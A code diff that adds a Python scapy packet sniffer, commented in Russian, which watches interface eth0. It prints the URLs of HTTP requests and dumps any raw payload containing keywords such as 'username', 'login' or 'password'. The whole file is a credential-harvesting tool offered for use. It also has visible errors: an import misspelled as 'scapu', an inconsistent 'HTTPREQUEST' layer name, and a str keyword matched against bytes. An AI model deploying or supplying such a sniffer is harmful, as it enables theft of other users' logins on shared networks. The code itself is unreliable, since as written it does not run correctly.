@@ -1,0 +1,30 @@
+import scapy.all as scapy
+from scapu.layers import http
+
+#pip install scapy_http
+
+print('Выберите протокол, по которому будут фильтроваться данные')
+filter_sniff = str(input('(прим. udp -> 1, tcp ->2, arp -> 3, port -> port <number>): '))
+if filter_sniff == '1':
+    filter_sniff = 'udp'
+if filter_sniff == '2':
+    filter_sniff = 'tcp'
+if filter_sniff == '3':
+    filter_sniff = 'arp'
+
+def sniff(interface):
+    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet, filter = filter_sniff)
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest): #Отбираем пакеты с http
+        url = packet[http.HTTPREQUEST].Host + packet[http.HTTPREQUEST].Path
+        print(url) #Просматриваем url адреса
+
+        if packet.haslayer(scapy.Raw): #Просматриваем логин и пароль
+            load = packet[scapy.Raw].load
+            keywords = ['username', 'user', 'login', 'password', 'pass']
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+                    break
+sniff('eth0')
